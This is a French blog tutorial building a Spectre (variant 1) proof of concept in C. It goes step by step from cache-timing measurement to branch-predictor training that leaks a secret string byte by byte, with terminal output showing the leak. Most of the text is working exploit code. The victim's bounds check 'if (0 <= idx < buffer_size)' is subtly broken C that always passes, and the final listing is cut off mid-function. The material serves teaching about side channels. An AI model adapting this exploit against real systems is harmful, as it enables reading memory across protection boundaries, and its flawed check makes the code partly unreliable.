---
title: "Construction d'un PoC pour Spectre"
date: 2018-01-25 22:28:14
author: "Pixis"
layout: post
permalink: /construction-poc-spectre/
disqus_identifier: 0000-0000-0000-001f
cover: assets/uploads/2018/01/spectre_poc.png
description: "Aujourd'hui, nous allons construire une preuve de concept de l'attaque Spectre afin de mettre en pratique la théorie de cette attaque présentée dans l'article précédant."
tags:
  - "User Land"
  - Linux
  - Hardware
---

Aujourd'hui, nous allons construire une preuve de concept (PoC - *Proof of Concept*) de l'attaque Spectre afin de mettre en pratique la théorie de cette attaque présentée dans l'article [Meltdown et Spectre](/meltdown-spectre).

Cet article nécessite des connaissances dans le langage de programmation C pour pouvoir le suivre.

<!--more-->

## Introduction

Le développement de cet exemple va se dérouler en quatre parties.

1. La première va mettre en évidence le temps d'accès à la mémoire vive lorsqu'on accède à des zones mémoires qui ne sont pas dans le cache.
2. Nous verrons ensuite la différence de temps d'accès entre une zone mémoire cachée et une non cachée.
3. La mise en cache d'une zone mémoire lors de prédiction de branche sera mise en avant.
4. Nous finirons en divulguant un secret intrinsèque au programme que nous n'aurions jamais pu découvrir sans utiliser cette technique.

## PoC de temps d'accès à la RAM

La structure du programme évoluera avec les chapitres. Ici, nous allons développer un programme simple qui va initialiser un buffer de 256 pages, le supprimer du cache, et nous allons accéder à toutes les pages de ce buffer en mesurant le nombre de cycles d'horloge qui se sont écoulés avant et après l'accès à chaque zone mémoire.

Le programme aura donc la structure suivante

```c
/* Initialisation du buffer de 256 pages */
char paged_buffer[256 * PAGE_SIZE];

/* Calcul du temps d'accès à une page du buffer */
uint32_t get_index_access_time(int value) {
    flush(paged_buffer[value * PAGE_SIZE]); // On supprime la page de tous les niveaux de cache

    int before = __rdtsc(); // Donne le nombre de cycle d'horloge actuel
    access(paged_buffer[value * PAGE_SIZE]); // Accès à la zone mémoire
    int after  = __rdtsc(); // Donne le nombre de cycle d'horloge suite à l'accès mémoire
    return after - before; // On retourne la différence pour avoir le temps d'accès
}

int main(void) {
    /* Pour toutes les pages du buffer, on calcule le temps d'accès */
    for(int i = 0; i < 256; i++) {
        printf("%c: %u\n",i, get_index_access_time(i));
    }
}
```

Ce code simplifié permet de comprendre l'idée que nous cherchons à montrer. Toutes les pages sont supprimées du cache, puis on mesure le nombre de cycles d'horloge nécessaires pour accéder à chacunes de ces pages. L'ordre de grandeur pour accéder à une page en mémoire, c'est 300 cycles d'horloge, tandis que lorsqu'elle est en cache, c'est inférieur à 80 cycles d'horloge.

Le programme complet et fonctionnel va faire une moyenne sur 100 accès, afin d'éviter les faux positifs. Le voici :

**poc_no_cache.c**

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <x86intrin.h>

#define GREEN   "\x1b[32m"
#define RESET   "\x1b[0m"

#define PAGE_SIZE 512
#define COUNT 100

volatile char paged_buffer[256 * PAGE_SIZE];
volatile uint32_t paged_buffer_sz = 256 * PAGE_SIZE;

void access_value(uint32_t x) {
    /* Wrapper pour éviter les optimisations */
    (void)x;
}

uint32_t get_index_access_time(int value) {
    uint32_t cycle_difference = 0;
    uint32_t access_time = 0;
    uint32_t in_ram = 0;
    uint32_t in_cache = 0;

    /* Récupère l'index de la page à laquelle on accède */
    value *= PAGE_SIZE;
    
    /* Boucle pour faire une moyenne sur COUNT accès */
    for(int i = 0; i < COUNT; i++) {

        /* Vidage du cache */
        for(int j = 0; j < 256; j++) {
            _mm_clflush((void*)(paged_buffer + j * PAGE_SIZE));
        }

        int before, after;

        before = __rdtsc(); // Donne le nombre de cycle d'horloge actuel
        access_value(paged_buffer[value]); // Accès à la page
        _mm_lfence(); // Permet d'éviter que 'after' soit récupéré avant que 'access_value' ne termine
        after = __rdtsc(); // Donne le nombre de cycle d'horloge actuel

        uint32_t diff = (uint32_t)(after-before); // Nombre de cycles pour l'accès à la zone mémoire

        access_time += diff;
        
        /*
         * Si le temps d'accès était supérieur à 80 cycles, alors on considère que la plage mémoire
         * étant dans la RAM
         * Sinon, elle était probablement dans le cache
         */
        if (diff > 80) {
            in_ram++;
        } else {
            in_cache++;
        }
    }

    /* S'il y a plus eu de cas en cache qu'en RAM, on ajoute une astérisque verte */
    if(in_cache > in_ram)
        printf("[" GREEN "*" RESET "] ");
    else
        printf("[ ] ");
    printf("% 4i % 4i % 5i - ", in_cache, in_ram, access_time / COUNT );
    if(in_cache > in_ram) {
        return 1;
    }
    return 0;
}


void get_all_access_time() {
    /*
     * Pour toutes les pages du buffer, on calcule le temps d'accès
     * CACHE : Nombre de fois où le nombre de cycle d'horloge était < à 80
     * MEM : Nombre de fois où le nombre de cycle d'horloge était > à 80
     * CYCLES : Moyenne du nombre de cycle d'horloge pour l'accès
     * HIT : Indique si, en moyenne, on a trouvé que la variable était en cache
     */
    printf(
        "    CACHE MEM CYCLES    HIT\n"
        "---------------------------\n");
    for(int i = 0; i < 256; i++) {
        printf("%c: %u\n",i, get_index_access_time(i));
    }

}

int main(void) {
    for (int i = 0; i < sizeof(paged_buffer); i++) {
        paged_buffer[i] = 1; /* Permet d'éviter une optimisation appelée lazy allocation */
    }

    get_all_access_time();
    
    return 0;
}
```

Ce programme bien fourni en commentaires est fonctionnel. Voici un aperçu du résultat lorsqu'il est compilé sans optimisation

```
pixis@hackndo:~/spectre$ gcc -O0 poc_no_cache.c -o poc_no_cache && ./poc_no_cache
    CACHE MEM CYCLES    HIT
---------------------------
[...]
[ ]    0  100   291 - o: 0
[ ]    0  100   287 - p: 0
[ ]    1   99   271 - q: 0
[ ]    1   99   272 - r: 0
[ ]    0  100   304 - s: 0
[ ]    0  100   268 - t: 0
[ ]    0  100   272 - u: 0
[ ]    0  100   278 - v: 0
[ ]    0  100   284 - w: 0
[...]
```

Nous voyons que le nombre de cycles d'horloge moyen nécessaires à l'accès d'une page est d'environ 200 ou 300 cycles, et que la grande majorité des essais indiquent que les accès sont en RAM, sauf quelques très rares faux positifs (2 faux positifs pour 900 essais dans l'extrait ci-dessus).

Il est alors temps de mettre en évidence l'apport du cache sur ce type d'accès.

## PoC de mise en évidence de la mise en cache

Pour mettre en évidence la mise en cache, nous allons compléter le code simplifié du premier exemple. Nous vidions le cache avant chaque accès en mémoire, tandis que maintenant, nous allons choisir une page mémoire, et après avoir vidé le cache, nous allons accéder à cette page avant de mesurer le temps d'accès. Ainsi, en accédant à cette page, le processeur va la mettre en cache, et le temps d'accès que nous calculerons ensuite sera plus rapide pour cette zone.

Il suffit donc de rajouter un accès mémoire pour un index juste après avoir vidé le cache. Le code minimaliste devient ceci :

```c
/* Initialisation du buffer de 256 pages */
char paged_buffer[256 * PAGE_SIZE];

/* Calcul du temps d'accès à une page du buffer */
uint32_t get_index_access_time(int idx, int value) {
    flush(paged_buffer[value * PAGE_SIZE]); // On supprime la page de tous les niveaux de cache


    /* C'est ici que nous ajoutons un accès à un index défini dans main(), 'H' ou 72 dans notre exemple */
    access(paged_buffer[idx * PAGE_SIZE])

    int before = __rdtsc(); // Donne le nombre de cycle d'horloge actuel
    access(paged_buffer[value * PAGE_SIZE]); // Accès à la zone mémoire
    int after  = __rdtsc(); // Donne le nombre de cycle d'horloge suite à l'accès mémoire
    return after - before; // On retourne la différence pour avoir le temps d'accès
}

int main(void) {
    /* Pour toutes les pages du buffer, on calcule le temps d'accès */
    for(int i = 0; i < 256; i++) {
        /* Le premier argument, c'est l'index que nous allons mettre en cache */
        printf("%c: %u\n",i, get_index_access_time('H', i)); // 'H' est un char qui correspond à 72 en ASCII
    }
}
``` 

Si vous avez compris ce code raccourci, cela vous permettra de mieux comprendre la différence entre le programme suivant, et celui que nous avons vu lors de l'absence de mise en cache.

**poc_cache.c**

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <x86intrin.h>

#define GREEN   "\x1b[32m"
#define RESET   "\x1b[0m"

#define PAGE_SIZE 512
#define COUNT 100

volatile uint8_t paged_buffer[256 * PAGE_SIZE];
volatile uint32_t paged_buffer_sz = 256 * PAGE_SIZE;


void access_value(uint32_t x) {
    /* Wrapper pour éviter les optimisations */
    (void)x;
}

void delay() {
    /* Ne fait rien à part faire passer le temps */
    uint32_t x = 0x1234;
    for(volatile int i = 0; i < 1000; i++) {
        x *= i;
        x ^= 123;
        x *= 173;
    }
}

uint32_t get_index_access_time(int idx, int value) {
    uint32_t cycle_difference = 0;
    uint32_t access_time = 0;
    uint32_t in_ram = 0;
    uint32_t in_cache = 0;

    /* Récupère l'index de la page à laquelle on accède */
    value *= PAGE_SIZE;
    idx *= PAGE_SIZE;
    
    /* Boucle pour faire une moyenne sur COUNT accès */
    for(int i = 0; i < COUNT; i++) {

        /* Vidage du cache */
        for(int j = 0; j < 256; j++) {
            _mm_clflush((void*)(paged_buffer + j * PAGE_SIZE));
        }

        access_value(paged_buffer[idx]); // Accès à la page

        /* On s'assure que l'accès est terminé avant de continuer */
        _mm_lfence();
        delay();

        int before, after;

        before = __rdtsc(); // Donne le nombre de cycle d'horloge actuel
        access_value(paged_buffer[value]); // Accès à la page
        _mm_lfence(); // Permet d'éviter que 'after' soit récupéré avant que 'access_value' ne termine
        after = __rdtsc(); // Donne le nombre de cycle d'horloge actuel

        uint32_t diff = (uint32_t)(after-before); // Nombre de cycles pour l'accès à la zone mémoire

        access_time += diff;
        
        /*
         * Si le temps d'accès était supérieur à 80 cycles, alors on considère que la plage mémoire
         * étant dans la RAM
         * Sinon, elle était probablement dans le cache
         */
        if (diff > 80) {
            in_ram++;
        } else {
            in_cache++;
        }
    }
    if(in_cache > in_ram)
        printf("[" GREEN "*" RESET "] ");
    else
        printf("[ ] ");
    printf("% 4i % 4i % 5i - ", in_cache, in_ram, access_time / COUNT );
    if(in_cache > in_ram) {
        return 1;
    }
    return 0;
}


void get_all_access_time(int idx) {
    /*
     * Pour toutes les pages du buffer, on calcule le temps d'accès
     * CACHE : Nombre de fois où le nombre de cycle d'horloge était < à 80
     * MEM : Nombre de fois où le nombre de cycle d'horloge était > à 80
     * CYCLES : Moyenne du nombre de cycle d'horloge pour l'accès
     * HIT : Indique si, en moyenne, on a trouvé que la variable était en cache
     */
    printf(
        "    CACHE MEM CYCLES    HIT\n"
        "---------------------------\n");

    /* On réduit la plage pour l'exemple, car seule 'H' nous intéresse */
    for(int i = 'A'; i <= 'Z'; i++) {
        printf("%c: %u\n",i, get_index_access_time(idx, i));
    }

}

int main(void) {
    for (int i = 0; i < sizeof(paged_buffer); i++) {
        paged_buffer[i] = 1; /* Permet d'éviter une optimisation appelée lazy allocation */
    } 

    get_all_access_time('H'); // 'H' est un char qui correspond à 72 en ASCII
    
    return 0;
}
```

Voici donc un programme fonctionnel qui met en cache une page à l'index 72 (représenté par 'H' en ASCII). Nous avons réduit la boucle qui parcourt le tableau de pages car nous ne nous intéressons qu'à la mise en cache de l'index 72. La sortie du programme est la suivante :

```
pixis@hackndo:~/spectre$ gcc -O0 poc_cache.c -o poc_cache && ./poc_cache
    CACHE MEM CYCLES    HIT
---------------------------
[ ]    0  100   265 - A: 0
[ ]    0  100   262 - B: 0
[ ]    0  100   279 - C: 0
[ ]    0  100   281 - D: 0
[ ]    0  100   271 - E: 0
[ ]    0  100   277 - F: 0
[ ]    0  100   272 - G: 0
[*]  100    0    38 - H: 1
[ ]    0  100   262 - I: 0
[ ]    0  100   286 - J: 0
[ ]    0  100   278 - K: 0
[ ]    0  100   262 - L: 0
[ ]    0  100   270 - M: 0
[ ]    0  100   292 - N: 0
[ ]    0  100   280 - O: 0
[ ]    0  100   272 - P: 0
[ ]    0  100   329 - Q: 0
[ ]    0  100   702 - R: 0
[ ]    0  100   279 - S: 0
[ ]    0  100   256 - T: 0
[ ]    0  100   285 - U: 0
[ ]    0  100   268 - V: 0
[ ]    0  100   290 - W: 0
[ ]    0  100   277 - X: 0
[ ]    1   99   262 - Y: 0
[ ]    0  100   262 - Z: 0
```

L'index 72 (ou 'H') a bien été mis en cache. On le voit car la moyenne sur 100 accès est de 38 cycles d'horloge, et les 100 accès se sont faits en moins de 80 cycles, comme en témoigne la colonne 'CACHE'.

Maintenant que nous arrivons à connaître l'index de la page du tableau qui a été mise en cache, il est temps de voir que la prédiction va faire le même résultat, même si nous n'exécutons normalement pas le code car la branche ne devrait pas être prise.

## PoC de mise en cache par prédiction

Pour pouvoir mettre en pratique cet exemple, nous allons imaginer un cas (un peu) réel. Notre programme va être divisé en deux parties.

La première partie représentera un programme cible, victime, qui ne propose à ses utilisateurs qu'une seule fonction. Cette fonction permet d'accéder aux pages d'un buffer en utilisant les variables d'un autre buffer. La fonction mise à disposition est la suivante :

```c
/* Buffer maitrisé, des valeurs étant entre 0 et 255 */
int buffer[BUFFER_SIZE] = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15};

/* Une valeur absolument inaccessible avec la seule fonction ci-dessous */
char * secret = "SECRET";

int x;
void my_protected_function(int idx) {
    /*
     * La fonction vérifie que l'index fourni en paramètre est bien dans les limites du tableau
     * de ce programme. Le tableau "buffer" est initialisé/contrôlé par ce programme, donc
     * les valeurs sont maitrisées de telle sorte à ce que 0 <= buffer[idx] <= 255
     */
    if (0 <= idx < buffer_size) {
        x = x ^ paged_buffer[buffer[idx] * PAGE_SIZE];
    }
}
```

Un attaquant n'ayant accès qu'à cette fonction ne pourra à priori pas faire de buffer overflow pour essayer de sortir des informations qui ne sont pas dans le tableau `buffer`. En particulier, le contenu de la variable `secret` semble inatteignable. 

L'attaquant va utiliser la vulnérabilité présentée dans l'article sur [Meltdown et Spectre](/meltdown-spectre) qui explique en deux mots qu'il peut entraîner le processeur à suivre une branche lors d'une condition, puis, dans une optique d'optimisation, ce processeur exécutera le contenu de la branche en question la prochaine fois qu'il trouvera la condition, avant même d'avoir vérifié la validité de la condition. Bien entendu, si la condition s'avère fausse, le processeur annulera ses actions, sans pour autant effacer les mises en cache.

L'attaquant va donc entraîner le processeur à rentrer dans la condition de la fonction de la victime, donc l'habituer au fait que `0 <= idx < buffer_size`, puis une fois que le processeur est bien entraîné, l'attaquant va lui fournir une valeur qui n'est pas du tout dans cet intervalle. 

Voilà le code simplifié complété pour réaliser cette opération :

```c
/* Initialisation du buffer de 256 pages */
char paged_buffer[256 * PAGE_SIZE];

/* Le programme va entraîner 10 fois le processeur à prendre la branche puis changera d'index */
#define TRAIN 10
uint32_t get_index_access_time(int idx, int value) {
    flush(paged_buffer[value * PAGE_SIZE]); // On supprime la page de tous les niveaux de cache

    /* Un index valide est utilisé pour l'entraînement */
    int valid_idx = 2;
    for(int i = 0; i < TRAIN; i++) {
        my_protected_function(valid_idx);
    }

    /*
     * On accède ensuite à une zone mémoire qui n'est plus autorisée normalement
     * On va utiliser un index soigneusement choisi pour que la zone mémoire qui sera
     * accédée soit le premier octet du secret
     */
    my_protected_function(evil_idx);

    /*
     * La prédiction de branche devrait avoir lu la valeur du premier octet du secret 'S' ou 83 en décimal,
     * puis a dû accéder à l'index du tableau de page, mettant en cache la page à l'index 83.
     * Comme le processeur se rend compte de son erreur, les changements sont annulés, mais la mise
     * en cache existe encore. On va donc pouvoir mesurer les temps d'accès pour trouver cette fameuse
     * valeur.
     * Il faut faire cet entraînement pour chaque octet testé dans la boucle de la fonction main
     * Au moment où la boucle sera à 83 ou 'S' les instructions suivantes montreront que la valeur est en cache
     * On saura alors que le premier octet du secret est un 'S'
     */

    int before = __rdtsc(); // Donne le nombre de cycle d'horloge actuel
    access(paged_buffer[value * PAGE_SIZE]); // Accès à la zone mémoire
    int after  = __rdtsc(); // Donne le nombre de cycle d'horloge suite à l'accès mémoire
    return after - before; // On retourne la différence pour avoir le temps d'accès
}

int main(void) {
    /* Pour toutes les pages du buffer, on calcule le temps d'accès */
    for(int i = 'A'; i <= 'Z'; i++) {
        /* Le premier argument, c'est l'index permettant d'atteindre le premier octet du secret */
        int evil_idx = 0x12bb36f1; // Exemple au hasard, c'est pour simplifier le code
        printf("%c: %u\n",i, get_index_access_time(evil_idx, i));
    }
}

```

J'ai ajouté beaucoup de commentaires pour comprendre le fonctionnement de l'attaque dans ce programme. Normalement, ces commentaires suffisent à comprendre le programme. En les reportant dans un code fonctionnel, et en précisant des détails, voici le programme complet :

**poc_leak_one_byte.c**

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <x86intrin.h>

#define GREEN   "\x1b[32m"
#define RESET   "\x1b[0m"

#define PAGE_SIZE 512
#define COUNT 100
#define BUFFER_SIZE 16



/**
 ** CODE DE LA VICTIME
 **/

volatile uint32_t buffer_size = BUFFER_SIZE;

/* Buffer maitrisé, des valeurs étant entre 0 et 255 */
volatile uint8_t buffer[BUFFER_SIZE] = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15};

/* Une valeur absolument inaccessible avec la seule fonction ci-dessous */
char * secret = "SECRET";

volatile uint8_t paged_buffer[256 * PAGE_SIZE];
volatile uint32_t paged_buffer_sz = 256 * PAGE_SIZE;

int x;
void my_protected_function(int idx) {
    /*
     * La fonction vérifie que l'index fourni en paramètre est bien dans les limites du tableau
     * de ce programme. Le tableau "buffer" est initialisé/contrôlé par ce programme, donc
     * les valeurs sont maitrisées de telle sorte à ce que 0 <= buffer[idx] <= 255
     */
    if (0 <= idx < buffer_size) {
        x = x ^ paged_buffer[buffer[idx] * PAGE_SIZE];
    }
}

/**
 ** CODE DE L'ATTAQUANT
 **/

void access_value(uint32_t x) {
    /* Wrapper pour éviter les optimisations */
    (void)x;
}

void delay() {
    /* Ne fait rien à part faire passer le temps */
    uint32_t x = 0x1337;
    for(volatile int i = 0; i < 1000; i++) {
        x *= i;
        x ^= 444;
        x *= 555;
    }
}

#define TRAIN 30
#define FREQ 5
uint32_t get_index_access_time(int idx, int value) {
    uint32_t cycle_difference = 0;
    uint32_t access_time = 0;
    uint32_t in_ram = 0;
    uint32_t in_cache = 0;
    uint32_t diff = 0;

    /* Récupère l'index de la page à laquelle on accède */
    value *= PAGE_SIZE;

    /* Boucle pour faire une moyenne sur COUNT accès */
    for(int i = 0; i < COUNT; i++) {

        /* Vidage du cache */
        for(int j = 0; j < 256; j++) {
            _mm_clflush((void*)(paged_buffer + j * PAGE_SIZE));
        }
        
        /* Index trx qui est dans les limites du tableau */
        uint32_t trx = idx % buffer_size;

        /* Entrainement de la branche */
        for(int i = 0; i < TRAIN; i++) {
            /* On enlève la variable de taille du tableau du cache pour que la comparaison soit lente */
            _mm_clflush((void*)&buffer_size);
            delay();

            /*
             * Trick emprunté de plusieurs PoC en ligne.
             * Il permet de faire une condition, sans pour autant ajouter des branches
             * L'ajout de branche risque d'annuler l'optimisation du processeur qui verrait
             * plusieurs chemin, donc n'entraînerait pas correctement son choix de branche.
             *
             * Le pseudo-code équivalent est le suivant
             *
             * if (i % FREQ == 0) {
             *     addr = idx; // Index d'attaque
             * } else {
             *     addr = trx; // Index dans le tableau
             * }
             * 
             * En faisant ceci, encore dans une optique de moyenne, toutes les FREQ itération
             * on va essayer de jouer sur la prédiction avec l'index du secret en paramètre
             * En faisant cela plusieurs fois, il devrait y avoir au moins une mise en cache
             */

            int addr = ((i % FREQ)-1) & ~0xffff; // addr = 0xffff0000 si i % FREQ == 0
            addr = (addr | (addr >> 16)); // addr = FFFF si i % FREQ == 0
            addr = trx ^ (addr & (trx ^ idx)); // addr = idx si i % FREQ == 0; sinon trx

            my_protected_function(addr);
        }

        delay();

        int before, after;

        before = __rdtsc(); // Donne le nombre de cycle d'horloge actuel
        access_value(paged_buffer[value]); // Accès à la page
        _mm_lfence(); // Permet d'éviter que 'after' soit récupéré avant que 'access_value' ne termine
        after = __rdtsc(); // Donne le nombre de cycle d'horloge actuel

        uint32_t diff = (uint32_t)(after-before); // Nombre de cycles pour l'accès à la zone mémoire

        access_time += diff;
        
        /*
         * Si le temps d'accès était supérieur à 80 cycles, alors on considère que la plage mémoire
         * étant dans la RAM
         * Sinon, elle était probablement dans le cache
         */
        if (diff > 80) {
            in_ram++;
        } else {
            in_cache++;
        }
    }
    
    if(in_cache > in_ram)
        printf("[" GREEN "*" RESET "] ");
    else
        printf("[ ] ");
    printf("% 4i % 4i % 5i - ", in_cache, in_ram, access_time / COUNT );
    if(in_cache > in_ram) {
        return 1;
    }
    return 0;
}


void get_all_access_time(int idx) {
    /*
     * Pour toutes les pages du buffer, on calcule le temps d'accès
     * CACHE : Nombre de fois où le nombre de cycle d'horloge était < à 80
     * MEM : Nombre de fois où le nombre de cycle d'horloge était > à 80
     * CYCLES : Moyenne du nombre de cycle d'horloge pour l'accès
     * HIT : Indique si, en moyenne, on a trouvé que la variable était en cache
     */
    printf(
        "    CACHE MEM CYCLES    HIT\n"
        "---------------------------\n");

    /* On réduit la plage pour l'exemple, car seule 'H' nous intéresse */
    for(int i = 'A'; i <= 'Z'; i++) {
        printf("%c: %u\n",i, get_index_access_time(idx, i));
    }

}

int main(void) {
    for (int i = 0; i < sizeof(paged_buffer); i++) {
        paged_buffer[i] = 1; /* Permet d'éviter une optimisation appelée lazy allocation */
    }

    /*
     * L'index qu'on passe en argument sera utilisé de la manière suivante :
     * paged_buffer[buffer[idx] * PAGE_SIZE];
     * J'ai rappelé dans l'article sur meltdown et spectre que
     * buffer[idx]
     * était équivalent à
     * *(buffer + idx)
     * Donc pour accéder à l'adresse du premier octet de secret, on cherche
     * secret = buffer + idx
     * donc idx = secret - buffer
     * D'où le choix de l'argument dans l'instruction suivante.
     */
    get_all_access_time(secret - (char * ) buffer);
    return 0;
}
```

Encore une fois, ce code est très fourni en commentaires pour expliquer tous les mécanismes et les ajouts pour des cas particuliers. La sortie de ce programme est :

```
pixis@hackndo:~/spectre$ gcc -O0 poc_leak_one_byte.c -o poc_leak_one_byte && ./poc_leak_one_byte
    CACHE MEM CYCLES    HIT
---------------------------
[ ]    0  100   279 - A: 0
[ ]    0  100   292 - B: 0
[ ]    0  100   284 - C: 0
[ ]    0  100   288 - D: 0
[ ]    0  100   285 - E: 0
[ ]    0  100   288 - F: 0
[ ]    0  100   295 - G: 0
[ ]    0  100   284 - H: 0
[ ]    0  100   275 - I: 0
[ ]    0  100   264 - J: 0
[ ]    0  100   284 - K: 0
[ ]    0  100   258 - L: 0
[ ]    0  100   256 - M: 0
[ ]    0  100   267 - N: 0
[ ]    0  100   265 - O: 0
[ ]    0  100   277 - P: 0
[ ]    0  100   282 - Q: 0
[ ]    0  100   303 - R: 0
[*]   99    1    38 - S: 1
[ ]    0  100   275 - T: 0
[ ]    1   99   288 - U: 0
[ ]    0  100   300 - V: 0
[ ]    0  100   282 - W: 0
[ ]    0  100   276 - X: 0
[ ]    0  100   309 - Y: 0
[ ]    0  100   306 - Z: 0
```

Le programme indique donc que le premier octet du secret est un S ! C'est presque gagné pour finir le travail.

## PoC final pour trouver le secret

Le dernier programme est presque complet. Il ne reste plus qu'à boucler un certain nombre de fois pour avoir le secret en entier.

```c
/**
 ** CODE DE LA VICTIME
 **/

/* Buffer maitrisé, des valeurs étant entre 0 et 255 */
int buffer[BUFFER_SIZE] = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15};

/* Une valeur absolument inaccessible avec la seule fonction ci-dessous */
char * secret = "SECRET";

int x;
void my_protected_function(int idx) {
    /*
     * La fonction vérifie que l'index fourni en paramètre est bien dans les limites du tableau
     * de ce programme. Le tableau "buffer" est initialisé/contrôlé par ce programme, donc
     * les valeurs sont maitrisées de telle sorte à ce que 0 <= buffer[idx] <= 255
     */
    if (0 <= idx < buffer_size) {
        x = x ^ paged_buffer[buffer[idx] * PAGE_SIZE];
    }
}

/**
 ** CODE DE L'ATTAQUANT
 **/


/* Initialisation du buffer de 256 pages */
char paged_buffer[256 * PAGE_SIZE];

/* Le programme va entraîner 10 fois le processeur à prendre la branche puis changera d'index */
#define TRAIN 10
uint32_t get_index_access_time(int idx, int value) {
    flush(paged_buffer[value * PAGE_SIZE]); // On supprime la page de tous les niveaux de cache

    /* Un index valide est utilisé pour l'entraînement */
    int valid_idx = 2;
    for(int i = 0; i < TRAIN; i++) {
        my_protected_function(valid_idx);
    }

    /*
     * On accède ensuite à une zone mémoire qui n'est plus autorisée normalement
     * On va utiliser un index soigneusement choisi pour que la zone mémoire qui sera
     * accédée soit le premier octet du secret
     */
    my_protected_function(evil_idx);

    /*
     * La prédiction de branche devrait avoir lu la valeur du premier octet du secret 'S' ou 83 en décimal,
     * puis a dû accéder à l'index du tableau de page, mettant en cache la page à l'index 83.
     * Comme le processeur se rend compte de son erreur, les changements sont annulés, mais la mise
     * en cache existe encore. On va donc pouvoir mesurer les temps d'accès pour trouver cette fameuse
     * valeur.
     * Il faut faire cet entraînement pour chaque octet testé dans la boucle de la fonction main
     * Au moment où la boucle sera à 83 ou 'S' les instructions suivantes montreront que la valeur est en cache
     * On saura alors que le premier octet du secret est un 'S'
     */

    int before = __rdtsc(); // Donne le nombre de cycle d'horloge actuel
    access(paged_buffer[value * PAGE_SIZE]); // Accès à la zone mémoire
    int after  = __rdtsc(); // Donne le nombre de cycle d'horloge suite à l'accès mémoire
    return after - before; // On retourne la différence pour avoir le temps d'accès
}

int main(void) {
    /* Pour toutes les pages du buffer, on calcule le temps d'accès */
    int evil_idx = 0x12bb36f1; // Exemple au hasard, c'est pour simplifier le code

    /* On boucle sur la longueur du secret pour tout révéler */
    for(int j = 0; j < longueur_secret; j++) {
        for(int i = 'A'; i <= 'Z'; i++) {
            /* Le premier argument, c'est l'index permettant d'atteindre le premier octet du secret */
            printf("%c: %u\n",i, get_index_access_time(evil_idx + j, i)); // On ajoute un à chaque boucle pour avoir tout le secret
        }
    }
}
```

La boucle est faite dans la fonction `main`, on incrémente l'index correspondant au secret pour avoir le secret en entier. C'est assez simple à implémenter avec le programme précédant. Voici ce que le programme final complet donne :

**poc_final.c**

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <x86intrin.h>

#define GREEN   "\x1b[32m"
#define RESET   "\x1b[0m"

#define PAGE_SIZE 512
#define COUNT 100
#define BUFFER_SIZE 16



/**
 ** CODE DE LA VICTIME
 **/
volatile uint32_t buffer_size = BUFFER_SIZE;

/* Buffer maitrisé, des valeurs étant entre 0 et 255 */
volatile uint8_t buffer[BUFFER_SIZE] = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15};

/* Une valeur absolument inaccessible avec la seule fonction ci-dessous */
char * secret = "SECRET";

volatile uint8_t paged_buffer[256 * PAGE_SIZE];
volatile uint32_t paged_buffer_sz = 256 * PAGE_SIZE;

int x;
void my_protected_function(int idx) {
    /*
     * La fonction vérifie que l'index fourni en paramètre est bien dans les limites du tableau
     * de ce programme. Le tableau "buffer" est initialisé/contrôlé par ce programme, donc
     * les valeurs sont maitrisées de telle sorte à ce que 0 <= buffer[idx] <= 255
     */
    if (0 <= idx < buffer_size) {
        x = x ^ paged_buffer[buffer[idx] * PAGE_SIZE];
    }
}

/**
 ** CODE DE L'ATTAQUANT
 **/
void access_value(uint32_t x) {
    /* Wrapper pour éviter les optimisations */
    (void)x;
}

void delay() {
    /* Ne fait rien à part faire passer le temps */
    uint32_t x = 0x1337;
    for(volatile int i = 0; i < 1000; i++) {
        x *= i;
        x ^= 444;
        x *= 555;
    }
}

#define TRAIN 30
#define FREQ 5
uint32_t get_index_access_time(int idx, int value) {
    uint32_t cycle_difference = 0;
    uint32_t access_time = 0;
    uint32_t in_ram = 0;
    uint32_t in_cache = 0;
    uint32_t diff = 0;

    /* Récupère l'index de la page à laquelle on accède */
    value *= PAGE_SIZE;

    /* Boucle pour faire une moyenne sur COUNT accès */
    for(int i = 0; i < COUNT; i++) {

        /* Vidage du cache */
        for(int j = 0; j < 256; j++) {
            _mm_clflush((void*)(paged_buffer + j * PAGE_SIZE));
        }
        
        /* Index trx qui est dans les limites du tableau */
        uint32_t trx = idx % buffer_size;

        /* Entrainement de la branche */
        for(int i = 0; i < TRAIN; i++) {
            /* On enlève la variable de taille du tableau du cache pour que la comparaison soit lente */
            _mm_clflush((void*)&buffer_size);
            delay();

            /*
             * Trick emprunté de plusieurs PoC en ligne.
             * Il permet de faire une condition, sans pour autant ajouter des branches
             * L'ajout de branche risque d'annuler l'optimisation du processeur qui verrait
             * plusieurs chemin, donc n'entraînerait pas correctement son choix de branche.
             *
             * Le pseudo-code équivalent est le suivant
             *
             * if (i % FREQ == 0) {
             *     addr = idx; // Index d'attaque
             * } else {
             *     addr = trx; // Index dans le tableau
             * }
             * 
             * En faisant ceci, encore dans une optique de moyenne, toutes les FREQ itération
             * on va essayer de jouer sur la prédiction avec l'index du secret en paramètre
             * En faisant cela plusieurs fois, il devrait y avoir au moins une mise en cache
             */

            int addr = ((i % FREQ)-1) & ~0xffff; // addr = 0xffff0000 si i % FREQ == 0
            addr = (addr | (addr >> 16)); // addr = FFFF si i % FREQ == 0
            addr = trx ^ (addr & (trx ^ idx)); // addr = idx si i % FREQ == 0; sinon trx

            my_protected_function(addr);
        }

        delay();

        int before, after;

        before = __rdtsc(); // Donne le nombre de cycle d'horloge actuel
        access_value(paged_buffer[value]); // Accès à la page
        _mm_lfence(); // Permet d'éviter que 'after' soit récupéré avant que 'access_value' ne termine
        after = __rdtsc(); // Donne le nombre de cycle d'horloge actuel

        uint32_t diff = (uint32_t)(after-before); // Nombre de cycles pour l'accès à la zone mémoire

        access_time += diff;
        
        /*
         * Si le temps d'accès était supérieur à 80 cycles, alors on considère que la plage mémoire
         * étant dans la RAM
         * Sinon, elle était probablement dans le cache
         */
        if (diff > 80) {
            in_ram++;
        } else {
            in_cache++;
        }
    }

    if(in_cache > in_ram) {
        return 1;
    }
    return 0;
}


void get_all_access_time(int idx) {
    /* On réduit la plage pour l'exemple, car seule 'H' nous intéresse */
    for(int i = 'A'; i <= 'Z'; i++) {
        if (get_index_access_time(idx, i) == 1){
            printf("%c", i);
